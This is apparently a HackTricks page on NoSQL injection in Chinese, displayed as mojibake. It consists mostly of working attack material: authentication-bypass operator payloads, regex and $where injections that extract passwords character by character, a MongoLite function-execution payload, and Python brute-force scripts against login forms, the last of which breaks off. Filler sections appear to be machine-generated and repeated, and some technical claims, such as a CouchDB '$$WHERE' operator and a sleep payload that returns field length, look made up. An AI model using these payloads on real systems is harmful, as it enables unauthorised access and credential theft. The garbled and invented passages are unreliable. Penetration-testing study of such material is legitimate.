# NoSQLæ³¨å…¥

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

NoSQLæ•°æ®åº“æä¾›æ¯”ä¼ ç»ŸSQLæ•°æ®åº“æ›´å®½æ¾çš„ä¸€è‡´æ€§é™åˆ¶ã€‚é€šè¿‡å‡å°‘å…³ç³»çº¦æŸå’Œä¸€è‡´æ€§æ£€æŸ¥ï¼ŒNoSQLæ•°æ®åº“é€šå¸¸æä¾›æ€§èƒ½å’Œæ‰©å±•æ€§çš„ä¼˜åŠ¿ã€‚ç„¶è€Œï¼Œå³ä½¿å®ƒä»¬ä¸ä½¿ç”¨ä¼ ç»Ÿçš„SQLè¯­æ³•ï¼Œè¿™äº›æ•°æ®åº“ä»ç„¶å¯èƒ½å—åˆ°æ³¨å…¥æ”»å‡»çš„å½±å“ã€‚

## æ”»å‡»

åœ¨PHPä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡å°†å‘é€çš„å‚æ•°ä»_parameter=foo_æ›´æ”¹ä¸º_parameter\[arrName]=foo_æ¥å‘é€ä¸€ä¸ªæ•°ç»„ã€‚

è¿™äº›æ”»å‡»æ˜¯åŸºäºæ·»åŠ ä¸€ä¸ª**è¿ç®—ç¬¦**ï¼š
```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```
### åŸºæœ¬èº«ä»½éªŒè¯ç»•è¿‡

**ä½¿ç”¨ä¸ç­‰äº ($ne) æˆ–å¤§äº ($gt)**
```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```
### **SQL - Mongo**

### **SQLæ³¨å…¥æ”»å‡» - Mongo**

NoSQL databases, such as MongoDB, use a different query language than traditional SQL databases. However, they are still vulnerable to injection attacks. In the case of MongoDB, the attack is called NoSQL injection.

éå…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚MongoDBï¼‰ä½¿ç”¨ä¸ä¼ ç»ŸSQLæ•°æ®åº“ä¸åŒçš„æŸ¥è¯¢è¯­è¨€ã€‚ç„¶è€Œï¼Œå®ƒä»¬ä»ç„¶å®¹æ˜“å—åˆ°æ³¨å…¥æ”»å‡»çš„å½±å“ã€‚åœ¨MongoDBä¸­ï¼Œè¿™ç§æ”»å‡»è¢«ç§°ä¸ºNoSQLæ³¨å…¥ã€‚

NoSQL injection occurs when untrusted user input is directly concatenated into a query, allowing an attacker to manipulate the query's logic. This can lead to unauthorized access, data leakage, or even remote code execution.

å½“ä¸å—ä¿¡ä»»çš„ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°æŸ¥è¯¢ä¸­æ—¶ï¼Œå°±ä¼šå‘ç”ŸNoSQLæ³¨å…¥ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ“çºµæŸ¥è¯¢çš„é€»è¾‘ã€‚è¿™å¯èƒ½å¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€æ•°æ®æ³„éœ²ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

To prevent NoSQL injection, it is important to properly sanitize and validate user input before using it in a query. This can be done by using parameterized queries or prepared statements, which ensure that user input is treated as data and not as executable code.

ä¸ºäº†é˜²æ­¢NoSQLæ³¨å…¥ï¼Œé‡è¦çš„æ˜¯åœ¨ä½¿ç”¨ç”¨æˆ·è¾“å…¥ä¹‹å‰æ­£ç¡®åœ°å¯¹å…¶è¿›è¡Œæ¸…ç†å’ŒéªŒè¯ã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æˆ–é¢„ç¼–è¯‘è¯­å¥æ¥å®ç°è¿™ä¸€ç‚¹ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿ç”¨æˆ·è¾“å…¥è¢«è§†ä¸ºæ•°æ®è€Œä¸æ˜¯å¯æ‰§è¡Œä»£ç ã€‚

Additionally, it is recommended to follow the principle of least privilege when configuring database access. Limiting the privileges of database users can help mitigate the impact of a successful injection attack.

æ­¤å¤–ï¼Œåœ¨é…ç½®æ•°æ®åº“è®¿é—®æ—¶ï¼Œå»ºè®®éµå¾ªæœ€å°æƒé™åŸåˆ™ã€‚é™åˆ¶æ•°æ®åº“ç”¨æˆ·çš„æƒé™å¯ä»¥å¸®åŠ©å‡è½»æˆåŠŸæ³¨å…¥æ”»å‡»çš„å½±å“ã€‚

In conclusion, even though NoSQL databases use a different query language, they are still susceptible to injection attacks. By properly sanitizing user input and following the principle of least privilege, the risk of NoSQL injection can be significantly reduced.

æ€»ä¹‹ï¼Œå°½ç®¡éå…³ç³»å‹æ•°æ®åº“ä½¿ç”¨ä¸åŒçš„æŸ¥è¯¢è¯­è¨€ï¼Œä½†å®ƒä»¬ä»ç„¶å®¹æ˜“å—åˆ°æ³¨å…¥æ”»å‡»çš„å½±å“ã€‚é€šè¿‡æ­£ç¡®æ¸…ç†ç”¨æˆ·è¾“å…¥å¹¶éµå¾ªæœ€å°æƒé™åŸåˆ™ï¼Œå¯ä»¥æ˜¾è‘—é™ä½NoSQLæ³¨å…¥çš„é£é™©ã€‚
```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00
```
### æå–**é•¿åº¦**ä¿¡æ¯

In NoSQL injection attacks, it is often useful to extract information about the length of a particular field or parameter. This can help in understanding the structure of the database and crafting further attacks.

åœ¨NoSQLæ³¨å…¥æ”»å‡»ä¸­ï¼Œæå–ç‰¹å®šå­—æ®µæˆ–å‚æ•°çš„é•¿åº¦ä¿¡æ¯é€šå¸¸å¾ˆæœ‰ç”¨ã€‚è¿™æœ‰åŠ©äºç†è§£æ•°æ®åº“çš„ç»“æ„å¹¶æ„é€ è¿›ä¸€æ­¥çš„æ”»å‡»ã€‚

To extract the length of a field, you can use the `$where` operator in MongoDB or the `$$WHERE` operator in CouchDB. These operators allow you to execute JavaScript code on the server-side.

è¦æå–å­—æ®µçš„é•¿åº¦ï¼Œå¯ä»¥åœ¨MongoDBä¸­ä½¿ç”¨`$where`è¿ç®—ç¬¦æˆ–åœ¨CouchDBä¸­ä½¿ç”¨`$$WHERE`è¿ç®—ç¬¦ã€‚è¿™äº›è¿ç®—ç¬¦å…è®¸åœ¨æœåŠ¡å™¨ç«¯æ‰§è¡ŒJavaScriptä»£ç ã€‚

For example, in MongoDB, you can use the following payload to extract the length of the `username` field:

ä¾‹å¦‚ï¼Œåœ¨MongoDBä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè½½è·æ¥æå–`username`å­—æ®µçš„é•¿åº¦ï¼š

```
username[$where]=function(){sleep(5000);return this.length}
```

This payload uses the `sleep` function to delay the response by 5 seconds and then returns the length of the `username` field.

è¯¥æœ‰æ•ˆè½½è·ä½¿ç”¨`sleep`å‡½æ•°å»¶è¿Ÿ5ç§’é’Ÿçš„å“åº”ï¼Œç„¶åè¿”å›`username`å­—æ®µçš„é•¿åº¦ã€‚

In CouchDB, you can use the following payload to achieve the same result:

åœ¨CouchDBä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè½½è·æ¥å®ç°ç›¸åŒçš„ç»“æœï¼š

```
username[$$WHERE]=function(){sleep(5000);return this.length}
```

Remember to adjust the sleep time according to the response time of the server. If the response time is too short, you may need to increase the sleep time to ensure the length information is captured.

è¯·æ ¹æ®æœåŠ¡å™¨çš„å“åº”æ—¶é—´è°ƒæ•´ç¡çœ æ—¶é—´ã€‚å¦‚æœå“åº”æ—¶é—´å¤ªçŸ­ï¼Œå¯èƒ½éœ€è¦å¢åŠ ç¡çœ æ—¶é—´ä»¥ç¡®ä¿æ•è·é•¿åº¦ä¿¡æ¯ã€‚

By extracting the length information of a field, you can gather valuable insights into the structure of the database and proceed with further exploitation.

é€šè¿‡æå–å­—æ®µçš„é•¿åº¦ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥å¯¹æ•°æ®åº“çš„ç»“æ„è·å¾—æœ‰ä»·å€¼çš„è§è§£ï¼Œå¹¶ç»§ç»­è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚
```bash
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...
```
### æå–**æ•°æ®**ä¿¡æ¯

NoSQL databases, such as MongoDB, use a different query language than traditional SQL databases. This means that traditional SQL injection techniques may not work against NoSQL databases. However, NoSQL databases are still vulnerable to a type of injection attack known as NoSQL injection.

NoSQL injection occurs when untrusted user input is directly concatenated into a NoSQL query without proper sanitization or validation. This can allow an attacker to manipulate the query and extract sensitive data from the database.

To extract data from a NoSQL database using injection, you can use techniques similar to those used in SQL injection attacks. The goal is to manipulate the query in a way that allows you to bypass authentication, retrieve data from other users, or extract sensitive information.

Here are some common techniques used in NoSQL injection attacks:

1. **Boolean-based technique**: This technique involves injecting a condition that always evaluates to true, allowing you to retrieve data that would not normally be accessible.

2. **Time-based technique**: This technique involves injecting a delay into the query, allowing you to infer information based on the response time of the query.

3. **Error-based technique**: This technique involves injecting a query that intentionally causes an error, revealing information about the structure of the database or the query itself.

4. **Blind technique**: This technique involves injecting a query that does not produce a visible response, but allows you to infer information based on the behavior of the application.

To protect against NoSQL injection attacks, it is important to properly sanitize and validate user input before using it in a query. This can include techniques such as parameterized queries, input validation, and output encoding.

By understanding and applying these techniques, you can effectively extract data from NoSQL databases using injection attacks. However, it is important to note that performing such attacks without proper authorization is illegal and unethical. Always ensure you have the necessary permissions and legal authorization before conducting any penetration testing activities.
```
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
### **SQL - Mongo**

### **SQLæ³¨å…¥æ”»å‡» - Mongo**

NoSQL databases, such as MongoDB, are becoming increasingly popular due to their flexibility and scalability. However, just like SQL databases, NoSQL databases are also vulnerable to injection attacks.

éå…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚MongoDBï¼‰ç”±äºå…¶çµæ´»æ€§å’Œå¯æ‰©å±•æ€§è€Œè¶Šæ¥è¶Šå—æ¬¢è¿ã€‚ç„¶è€Œï¼Œä¸SQLæ•°æ®åº“ä¸€æ ·ï¼Œéå…³ç³»å‹æ•°æ®åº“ä¹Ÿå®¹æ˜“å—åˆ°æ³¨å…¥æ”»å‡»çš„å¨èƒã€‚

#### **What is NoSQL Injection?**

#### **ä»€ä¹ˆæ˜¯NoSQLæ³¨å…¥æ”»å‡»ï¼Ÿ**

NoSQL injection is a type of attack where an attacker exploits vulnerabilities in a NoSQL database query to manipulate or extract data from the database. This can occur when user input is not properly sanitized or validated before being used in a database query.

NoSQLæ³¨å…¥æ˜¯ä¸€ç§æ”»å‡»ç±»å‹ï¼Œæ”»å‡»è€…åˆ©ç”¨éå…³ç³»å‹æ•°æ®åº“æŸ¥è¯¢ä¸­çš„æ¼æ´æ¥æ“çºµæˆ–æå–æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚å½“ç”¨æˆ·è¾“å…¥åœ¨è¢«ç”¨äºæ•°æ®åº“æŸ¥è¯¢ä¹‹å‰æ²¡æœ‰ç»è¿‡é€‚å½“çš„æ¸…ç†æˆ–éªŒè¯æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚

#### **Common NoSQL Injection Techniques**

#### **å¸¸è§çš„NoSQLæ³¨å…¥æŠ€æœ¯**

1. **Boolean-based Injection**: This technique involves exploiting boolean-based queries to infer information from the database. By manipulating the query conditions, an attacker can determine if a query is true or false, and use this information to extract data.

1. **åŸºäºå¸ƒå°”çš„æ³¨å…¥**ï¼šè¿™ç§æŠ€æœ¯æ¶‰åŠåˆ©ç”¨åŸºäºå¸ƒå°”çš„æŸ¥è¯¢æ¥æ¨æ–­æ•°æ®åº“ä¸­çš„ä¿¡æ¯ã€‚é€šè¿‡æ“çºµæŸ¥è¯¢æ¡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥ç¡®å®šæŸ¥è¯¢æ˜¯çœŸè¿˜æ˜¯å‡ï¼Œå¹¶åˆ©ç”¨è¿™äº›ä¿¡æ¯æ¥æå–æ•°æ®ã€‚

2. **Time-based Injection**: In this technique, an attacker introduces time delays in the query to determine if a condition is true or false. By measuring the time it takes for a query to execute, an attacker can extract data from the database.

2. **åŸºäºæ—¶é—´çš„æ³¨å…¥**ï¼šåœ¨è¿™ç§æŠ€æœ¯ä¸­ï¼Œæ”»å‡»è€…åœ¨æŸ¥è¯¢ä¸­å¼•å…¥æ—¶é—´å»¶è¿Ÿï¼Œä»¥ç¡®å®šæ¡ä»¶æ˜¯çœŸè¿˜æ˜¯å‡ã€‚é€šè¿‡æµ‹é‡æŸ¥è¯¢æ‰§è¡Œæ‰€éœ€çš„æ—¶é—´ï¼Œæ”»å‡»è€…å¯ä»¥ä»æ•°æ®åº“ä¸­æå–æ•°æ®ã€‚

3. **Error-based Injection**: This technique involves exploiting error messages returned by the database to extract information. By injecting malicious input, an attacker can trigger database errors that reveal sensitive data.

3. **åŸºäºé”™è¯¯çš„æ³¨å…¥**ï¼šè¿™ç§æŠ€æœ¯æ¶‰åŠåˆ©ç”¨æ•°æ®åº“è¿”å›çš„é”™è¯¯æ¶ˆæ¯æ¥æå–ä¿¡æ¯ã€‚é€šè¿‡æ³¨å…¥æ¶æ„è¾“å…¥ï¼Œæ”»å‡»è€…å¯ä»¥è§¦å‘æ­ç¤ºæ•æ„Ÿæ•°æ®çš„æ•°æ®åº“é”™è¯¯ã€‚

#### **Preventing NoSQL Injection**

#### **é¢„é˜²NoSQLæ³¨å…¥æ”»å‡»**

To prevent NoSQL injection attacks, it is important to follow secure coding practices:

ä¸ºäº†é˜²æ­¢NoSQLæ³¨å…¥æ”»å‡»ï¼Œéµå¾ªå®‰å…¨ç¼–ç å®è·µéå¸¸é‡è¦ï¼š

1. **Input Validation**: Always validate and sanitize user input before using it in a database query. This includes checking for special characters and using parameterized queries or prepared statements.

1. **è¾“å…¥éªŒè¯**ï¼šåœ¨ä½¿ç”¨ç”¨æˆ·è¾“å…¥è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ä¹‹å‰ï¼Œå§‹ç»ˆéªŒè¯å’Œæ¸…ç†ç”¨æˆ·è¾“å…¥ã€‚è¿™åŒ…æ‹¬æ£€æŸ¥ç‰¹æ®Šå­—ç¬¦ï¼Œå¹¶ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æˆ–é¢„ç¼–è¯‘è¯­å¥ã€‚

2. **Least Privilege**: Ensure that the database user account used by the application has the least privileges necessary to perform its functions. Limiting the privileges reduces the potential impact of an injection attack.

2. **æœ€å°æƒé™åŸåˆ™**ï¼šç¡®ä¿åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ•°æ®åº“ç”¨æˆ·å¸æˆ·å…·æœ‰æ‰§è¡Œå…¶åŠŸèƒ½æ‰€éœ€çš„æœ€ä½æƒé™ã€‚é™åˆ¶æƒé™å¯ä»¥å‡å°‘æ³¨å…¥æ”»å‡»çš„æ½œåœ¨å½±å“ã€‚

3. **Error Handling**: Avoid displaying detailed error messages to users, as they can provide valuable information to attackers. Instead, log the errors internally and display generic error messages to users.

3. **é”™è¯¯å¤„ç†**ï¼šé¿å…å‘ç”¨æˆ·æ˜¾ç¤ºè¯¦ç»†çš„é”™è¯¯æ¶ˆæ¯ï¼Œå› ä¸ºè¿™äº›æ¶ˆæ¯å¯èƒ½ä¸ºæ”»å‡»è€…æä¾›æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚ç›¸åï¼Œå°†é”™è¯¯è®°å½•åœ¨å†…éƒ¨ï¼Œå¹¶å‘ç”¨æˆ·æ˜¾ç¤ºé€šç”¨çš„é”™è¯¯æ¶ˆæ¯ã€‚

By implementing these practices, you can significantly reduce the risk of NoSQL injection attacks and protect your NoSQL database from unauthorized access or data leakage.

é€šè¿‡å®æ–½è¿™äº›å®è·µï¼Œæ‚¨å¯ä»¥æ˜¾è‘—é™ä½NoSQLæ³¨å…¥æ”»å‡»çš„é£é™©ï¼Œå¹¶ä¿æŠ¤éå…³ç³»å‹æ•°æ®åº“å…å—æœªç»æˆæƒçš„è®¿é—®æˆ–æ•°æ®æ³„éœ²çš„å¨èƒã€‚
```
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
```
### PHPä»»æ„å‡½æ•°æ‰§è¡Œ

ä½¿ç”¨[MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite)åº“çš„**$func**è¿ç®—ç¬¦ï¼ˆé»˜è®¤ä½¿ç”¨ï¼‰å¯èƒ½ä¼šå¯¼è‡´æ‰§è¡Œä»»æ„å‡½æ•°ï¼Œå°±åƒ[è¿™ä¸ªæŠ¥å‘Š](https://swarm.ptsecurity.com/rce-cockpit-cms/)ä¸­æ‰€è¿°ã€‚
```python
"user":{"$func": "var_dump"}
```
![](<../.gitbook/assets/image (468).png>)

### ä»ä¸åŒçš„é›†åˆä¸­è·å–ä¿¡æ¯

å¯ä»¥ä½¿ç”¨[$lookup](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/)ä»ä¸åŒçš„é›†åˆä¸­è·å–ä¿¡æ¯ã€‚åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä»ä¸€ä¸ªåä¸º`users`çš„**ä¸åŒé›†åˆ**ä¸­è¯»å–æ•°æ®ï¼Œå¹¶è·å–æ‰€æœ‰å¯†ç ä¸é€šé…ç¬¦åŒ¹é…çš„æ¡ç›®çš„ç»“æœã€‚
```json
[
{
"$lookup":{
"from": "users",
"as":"resultado","pipeline": [
{
"$match":{
"password":{
"$regex":"^.*"
}
}
}
]
}
}
]
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ç›²æ³¨ NoSQL
```python
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
print("[i] Looking for char number "+str(i+1))
for char in alphabet:
r = requests.get("http://chall.com?param=^"+flag+char)
if ("<TRUE>" in r.text):
flag += char
print("[+] Flag: "+flag)
break
```

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""

while True:
for c in string.printable:
if c not in ['*','+','.','?','|']:
payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
r = requests.post(u, data = {'ids': payload}, verify = False)
if 'OK' in r.text:
print("Found one more char : %s" % (password+c))
password += c
```
## MongoDBæ”»å‡»è½½è·

### NoSQL Injection

### NoSQLæ³¨å…¥

NoSQL injection is a type of attack that targets NoSQL databases, such as MongoDB. It occurs when an attacker is able to manipulate a query in order to retrieve or modify data that they should not have access to.

NoSQLæ³¨å…¥æ˜¯ä¸€ç§é’ˆå¯¹NoSQLæ•°æ®åº“ï¼ˆå¦‚MongoDBï¼‰çš„æ”»å‡»ç±»å‹ã€‚å½“æ”»å‡»è€…èƒ½å¤Ÿæ“çºµæŸ¥è¯¢ä»¥æ£€ç´¢æˆ–ä¿®æ”¹ä»–ä»¬ä¸åº”è¯¥è®¿é—®çš„æ•°æ®æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚

In MongoDB, the query language is based on JSON-like syntax. This means that the attacker can exploit vulnerabilities in the query structure to inject malicious code.

åœ¨MongoDBä¸­ï¼ŒæŸ¥è¯¢è¯­è¨€åŸºäºç±»ä¼¼JSONçš„è¯­æ³•ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æŸ¥è¯¢ç»“æ„ä¸­çš„æ¼æ´æ¥æ³¨å…¥æ¶æ„ä»£ç ã€‚

### Basic NoSQL Injection Payloads

### åŸºæœ¬çš„NoSQLæ³¨å…¥è½½è·

Here are some basic payloads that can be used to perform NoSQL injection attacks against MongoDB:

ä»¥ä¸‹æ˜¯ä¸€äº›åŸºæœ¬çš„è½½è·ï¼Œå¯ç”¨äºå¯¹MongoDBæ‰§è¡ŒNoSQLæ³¨å…¥æ”»å‡»ï¼š

#### 1. True-based Payload

#### 1. åŸºäºTrueçš„è½½è·

```
{ $where: "this.username == 'admin' && this.password.match(/.*/i)" }
```

#### 2. False-based Payload

#### 2. åŸºäºFalseçš„è½½è·

```
{ $where: "this.username == 'admin' && this.password.match(/^$/)" }
```

#### 3. $ne Operator Payload

#### 3. $neè¿ç®—ç¬¦è½½è·

```
{ username: { $ne: null }, password: { $ne: null } }
```

#### 4. $regex Operator Payload

#### 4. $regexè¿ç®—ç¬¦è½½è·

```
{ username: { $regex: /admin/ }, password: { $regex: /.*/ } }
```

#### 5. $gt Operator Payload

#### 5. $gtè¿ç®—ç¬¦è½½è·

```
{ $where: "this.username == 'admin' && this.password.length > 0" }
```

#### 6. $where Operator Payload

#### 6. $whereè¿ç®—ç¬¦è½½è·

```
{ $where: "function() { return this.username == 'admin' && this.password.match(/.*/i); }" }
```

These payloads can be modified and combined to suit different scenarios and query structures.

è¿™äº›è½½è·å¯ä»¥æ ¹æ®ä¸åŒçš„æƒ…å†µå’ŒæŸ¥è¯¢ç»“æ„è¿›è¡Œä¿®æ”¹å’Œç»„åˆä½¿ç”¨ã€‚

### Advanced NoSQL Injection Payloads

### é«˜çº§NoSQLæ³¨å…¥è½½è·

In addition to the basic payloads, there are also advanced payloads that can be used to perform more complex NoSQL injection attacks:

é™¤äº†åŸºæœ¬çš„è½½è·å¤–ï¼Œè¿˜æœ‰ä¸€äº›é«˜çº§è½½è·å¯ç”¨äºæ‰§è¡Œæ›´å¤æ‚çš„NoSQLæ³¨å…¥æ”»å‡»ï¼š

#### 1. $where with JavaScript Code Execution

#### 1. ä½¿ç”¨JavaScriptä»£ç æ‰§è¡Œçš„$where

```
{ $where: "this.username == 'admin' && this.password.constructor === String && this.password.match(/.*/i) && this.password.length > 0" }
```

#### 2. $where with JavaScript Code Execution (Bypass Regex Filter)

#### 2. ä½¿ç”¨JavaScriptä»£ç æ‰§è¡Œçš„$whereï¼ˆç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤å™¨ï¼‰

```
{ $where: "this.username == 'admin' && this.password.constructor === String && this.password.match(/.*/i) && this.password.toString().length > 0" }
```

#### 3. $where with JavaScript Code Execution (Bypass Regex Filter and Length Check)

#### 3. ä½¿ç”¨JavaScriptä»£ç æ‰§è¡Œçš„$whereï¼ˆç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤å™¨å’Œé•¿åº¦æ£€æŸ¥ï¼‰

```
{ $where: "this.username == 'admin' && this.password.constructor === String && this.password.toString().match(/.*/i) && this.password.toString().length > 0" }
```

These advanced payloads can be used to bypass filters and perform more sophisticated attacks.

è¿™äº›é«˜çº§è½½è·å¯ç”¨äºç»•è¿‡è¿‡æ»¤å™¨å¹¶æ‰§è¡Œæ›´å¤æ‚çš„æ”»å‡»ã€‚
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```
## å·¥å…·

* [https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)
* [https://github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)

### ä»POSTç™»å½•ä¸­æš´åŠ›ç ´è§£ç”¨æˆ·åå’Œå¯†ç 

è¿™æ˜¯ä¸€ä¸ªç®€å•çš„è„šæœ¬ï¼Œä½ å¯ä»¥ä¿®æ”¹å®ƒï¼Œä½†ä¹‹å‰çš„å·¥å…·ä¹Ÿå¯ä»¥å®Œæˆè¿™ä¸ªä»»åŠ¡ã€‚
```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
print("Extracting password of "+username)
params = {"username":username, "password[$regex]":"", "login": "login"}
password = "^"
while True:
for c in possible_chars:
params["password[$regex]"] = password + c + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
password += c
break
if c == possible_chars[-1]:
print("Found password "+password[1:].replace("\\", "")+" for username "+username)
return password[1:].replace("\\", "")

def get_usernames():
usernames = []
